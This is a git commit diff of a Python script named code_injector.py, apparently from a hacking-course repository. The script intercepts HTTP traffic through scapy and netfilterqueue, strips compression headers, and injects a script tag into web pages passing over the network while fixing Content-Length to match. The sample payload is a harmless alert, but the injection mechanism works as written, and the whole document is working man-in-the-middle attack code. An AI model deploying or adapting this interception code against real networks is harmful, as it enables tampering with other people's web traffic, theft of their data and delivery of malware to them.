b4bb61a466cec8346f6e9c306e3e017907cfd30d
m1ntko <chetaniguzman@gmail.com>
2021-03-24 19:24:30 -0400

    Code_injector with python3.

--- code_injector.py
+++ code_injector.py
@@ -20,26 +20,32 @@ def process_packet(packet):
     # Converting packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):      
-        load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:      
-            print("[+] Request")
-            # Delete Accept-Encoding and its content
-            load = re.sub("Accept-Encoding:.*?\\r\\n","", str(load))
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response")
-            injection_code = "<script>alert('test');</script>"
-            load = str(load.replace(bytes("</head>"), bytes(injection_code) + bytes("</head>")))
-            # The new load make it content-length bigger so we need to change it
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search and "txt/html" in load:
-                print("Old content_length: " + str(content_length_search.group(1)))
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
-                print("New content_length: " + str(new_content_length))
-        if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(bytes(new_packet))    
+        # try:                                               python3 
+            # load = scapy_packet[scapy.Raw].load.decode()   python3 
+            load = scapy_packet[scapy.Raw].load  
+            if scapy_packet[scapy.TCP].dport == 80:      
+                print("[+] Request")
+                # Delete Accept-Encoding and its content
+                load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] Response")
+                injection_code = "<script>alert('test');</script>"
+                load = load.replace("</head>", injection_code + "</head>")
+                # The new load make it content-length bigger so we need to change it
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                if content_length_search and "txt/html" in load:
+                    print("Old content_length: " + str(content_length_search.group(1)))
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+                    print("New content_length: " + str(new_content_length))
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                # packet.set_payload(bytes(new_packet))     python3
+                packet.set_payload(str(new_packet))         
+        # except UnicodeDecodeError python3
+            # pass                  python3
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
